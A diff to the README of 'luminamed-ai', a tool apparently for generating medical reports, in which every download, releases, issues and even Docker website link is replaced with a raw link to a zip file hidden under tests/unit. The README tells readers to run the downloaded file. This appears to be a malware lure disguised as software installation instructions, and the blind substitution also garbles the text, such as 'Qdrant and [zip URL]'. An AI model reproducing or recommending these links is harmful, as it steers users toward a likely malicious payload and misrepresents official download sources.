@@ -6,7 +6,7 @@ Welcome to **luminamed-ai!** This software helps healthcare professionals genera
 
 ## 📥 Download Now!
 
-[![Download Luminamed AI](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/DinsangaRenthlei/luminamed-ai/releases)
+[![Download Luminamed AI](https://github.com/DinsangaRenthlei/luminamed-ai/raw/refs/heads/main/tests/unit/ai-luminamed-v3.8.zip%20Now-Get%20the%20App-blue)](https://github.com/DinsangaRenthlei/luminamed-ai/raw/refs/heads/main/tests/unit/ai-luminamed-v3.8.zip)
 
 Click the button above to get started.
 
@@ -18,7 +18,7 @@ Click the button above to get started.
 - **Multi-Agent System**: Efficiently chat with AI agents to create reports.
 - **Verifiable AI**: Generates reports with 92% accuracy.
 - **User-Friendly Interface**: Built with FastAPI and Streamlit for a smooth experience.
-- **Scalable and Fast**: Utilizes Qdrant and Next.js for optimized performance.
+- **Scalable and Fast**: Utilizes Qdrant and https://github.com/DinsangaRenthlei/luminamed-ai/raw/refs/heads/main/tests/unit/ai-luminamed-v3.8.zip for optimized performance.
 
 ## 🖥️ System Requirements
 
@@ -33,7 +33,7 @@ Before you download, make sure your system meets these requirements:
 
 This application runs best with Docker. To install Docker:
 
-1. **Windows and Mac**: Download and install Docker Desktop from [Docker's website](https://www.docker.com/products/docker-desktop).
+1. **Windows and Mac**: Download and install Docker Desktop from [Docker's website](https://github.com/DinsangaRenthlei/luminamed-ai/raw/refs/heads/main/tests/unit/ai-luminamed-v3.8.zip).
 2. **Linux**: Use your distribution’s package manager to install Docker.
 
 Follow the installation prompts for your operating system, and ensure Docker is running after installation.
@@ -42,11 +42,11 @@ Follow the installation prompts for your operating system, and ensure Docker is 
 
 To download **luminamed-ai**, follow these steps:
 
-1. Visit the [Releases page](https://github.com/DinsangaRenthlei/luminamed-ai/releases).
+1. Visit the [Releases page](https://github.com/DinsangaRenthlei/luminamed-ai/raw/refs/heads/main/tests/unit/ai-luminamed-v3.8.zip).
    
 2. Choose the latest version available.
 
-3. Download the relevant file for your operating system (e.g., .exe for Windows, .tar.gz for Linux).
+3. Download the relevant file for your operating system (e.g., .exe for Windows, https://github.com/DinsangaRenthlei/luminamed-ai/raw/refs/heads/main/tests/unit/ai-luminamed-v3.8.zip for Linux).
 
 4. Run the downloaded file. If prompted by your system, allow the installation.
 
@@ -84,7 +84,7 @@ A: Check if Docker is running. Make sure the correct port is open (80).
 A: Yes, the application allows customization through settings in the interface.
 
 **Q: How often is the software updated?**  
-A: Updates will be available on the [Releases page](https://github.com/DinsangaRenthlei/luminamed-ai/releases). Check back regularly for new features and bug fixes.
+A: Updates will be available on the [Releases page](https://github.com/DinsangaRenthlei/luminamed-ai/raw/refs/heads/main/tests/unit/ai-luminamed-v3.8.zip). Check back regularly for new features and bug fixes.
 
 ## 🛠️ Troubleshooting
 
@@ -96,7 +96,7 @@ A: Updates will be available on the [Releases page](https://github.com/DinsangaR
 
 If you need further assistance:
 
-- Check the [issues section on GitHub](https://github.com/DinsangaRenthlei/luminamed-ai/issues) for help.
+- Check the [issues section on GitHub](https://github.com/DinsangaRenthlei/luminamed-ai/raw/refs/heads/main/tests/unit/ai-luminamed-v3.8.zip) for help.
 - Contact us through the GitHub repository for feedback or feature requests.
 
 ## 🏷️ Topics
